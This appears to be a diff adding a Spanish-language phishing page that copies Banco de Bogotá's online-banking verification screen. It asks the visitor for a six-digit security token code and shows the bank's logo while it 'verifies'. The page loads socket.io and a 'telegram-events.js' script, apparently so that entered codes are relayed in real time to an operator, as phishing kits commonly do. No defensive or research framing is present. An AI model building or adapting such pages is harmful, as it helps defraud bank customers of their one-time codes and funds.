@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingreso a Banca Virtual - Verificación</title>
+    <link rel="stylesheet" href="token.css">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/common.js"></script>
+    <script src="js/loading-screen.js"></script>
+    <script src="js/telegram-events.js"></script>
+</head>
+<body>
+    <div class="header">
+        <div class="nav-left">
+            <a href="javascript:history.back()" class="back-btn">← Atrás</a>
+        </div>
+        <div class="nav-center">
+            <h1>Ingreso a Banca Virtual</h1>
+        </div>
+        <div class="nav-right">
+            <button onclick="window.close()" class="abandon-btn">Abandonar ×</button>
+        </div>
+    </div>
+
+    <div class="login-section">
+        <h2>Verifiquemos que seas tú</h2>
+        
+        <div class="token-container">
+            <div class="token-icon">
+                <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Token Icon" class="bank-logo">
+            </div>
+            <div class="token-content">
+                <h3>Código Token <span class="info-icon">ⓘ</span></h3>
+                <p>Para realizar este proceso, ingresa el código de Token móvil o físico.</p>
+                
+                <div class="token-input-container">
+                    <input type="tel" maxlength="1" class="token-input" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-input" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-input" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-input" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-input" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-input" pattern="[0-9]">
+                </div>
+
+                <button class="verify-btn" disabled>Verificar</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="error-message" style="display: none;">
+        <p>⚠️ El código token ingresado es incorrecto. Por favor intente nuevamente.</p>
+    </div>
+
+    <div class="loading-screen" style="display: none;">
+        <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá" class="loading-logo">
+        <div class="spinner"></div>
+        <p>Verificando...</p>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Verificar si hay mensaje de error al cargar la página
+        window.addEventListener('DOMContentLoaded', () => {
+            const errorMessage = sessionStorage.getItem('errorMessage');
+            if (errorMessage) {
+                const loginError = document.querySelector('.login-error');
+                if (loginError) {
+                    loginError.style.display = 'block';
+                    loginError.textContent = errorMessage;
+                }
+                // Limpiar el mensaje después de mostrarlo
+                sessionStorage.removeItem('errorMessage');
+            }
+        });
+    </script>
+    <script src="token.js"></script>
+</body>
+</html>
